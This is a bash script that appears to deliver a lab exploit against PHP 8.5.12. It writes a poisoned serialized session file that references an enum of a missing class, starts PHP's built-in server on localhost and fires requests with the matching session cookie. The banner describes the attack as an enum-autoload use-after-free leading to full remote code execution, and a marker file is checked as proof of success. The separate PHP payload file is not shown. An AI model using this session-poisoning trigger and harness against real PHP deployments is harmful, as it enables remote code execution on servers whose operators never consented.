#!/bin/bash
# fa_enum_sess_run.sh — MISSION 2 session-decode delivery run (plain2 8.5.12):
# serve the victim with php -S, poison the session file, fire over HTTP.
# Fresh server per run: the post-call stack-smash kills the single-process
# cli-server (Apache/mod_php respawns workers instead).
set -u
PHP=/tmp/php8512_build/plain2/sapi/cli/php
ART=/mnt/c/Users/andre/Downloads/php2shell-claude
ROOT=/tmp/fa_sess_lab
PORT=18391
SID=faenumsess00000000000000000000A
RUNS=${1:-3}

rm -rf "$ROOT"; mkdir -p "$ROOT/html" "$ROOT/sess"
cp "$ART/fa_enum_sess.php" "$ROOT/html/"
rm -f /tmp/fa_enum_sess /tmp/fa_enum_sess_diag.log

# poison the session file directly (lab attacker vantage on the session dir)
printf 'x|a:3:{i:0;E:11:"Missing:Foo";i:1;i:1;i:2;i:2;}' > "$ROOT/sess/sess_$SID"

start_srv() {
  pkill -f "127.0.0.1:$PORT" 2>/dev/null; sleep 0.3
  $PHP -n -d session.save_path="$ROOT/sess" -d session.serialize_handler=php \
       -S 127.0.0.1:$PORT -t "$ROOT/html" > "$ROOT/server.log" 2>&1 &
  SRV=$!
  disown
  for i in $(seq 1 30); do
    curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$PORT/fa_enum_sess.php" 2>/dev/null && break
    sleep 0.3
  done
}

{
echo "############################################################"
echo "# MISSION 2 - E: enum-autoload UAF -> full RCE via SESSION DECODE"
echo "# target: plain2 PHP 8.5.12 built-in server, ASLR on, no gdb"
echo "# poison: sess file = x|a:3:{i:0;E:11:Missing:Foo;...}"
echo "# $(date -u +%FT%TZ)"
echo "############################################################"
for r in $(seq 1 "$RUNS"); do
  rm -f /tmp/fa_enum_sess /tmp/fa_enum_sess_diag.log
  start_srv
  echo "--- run $r: GET with poisoned session cookie ---"
  curl -s --max-time 10 -b "PHPSESSID=$SID" "http://127.0.0.1:$PORT/fa_enum_sess.php" | head -4
  if [ -f /tmp/fa_enum_sess ]; then
    echo "[PASS run $r] marker: $(cat /tmp/fa_enum_sess)"
  else
    echo "[fail run $r] no marker"
  fi
done
echo "---- diag (last) ----"
cat /tmp/fa_enum_sess_diag.log 2>/dev/null
} | tee /tmp/fa_enum_sess_receipt.log
pkill -f "127.0.0.1:$PORT" 2>/dev/null
echo "receipt: /tmp/fa_enum_sess_receipt.log"
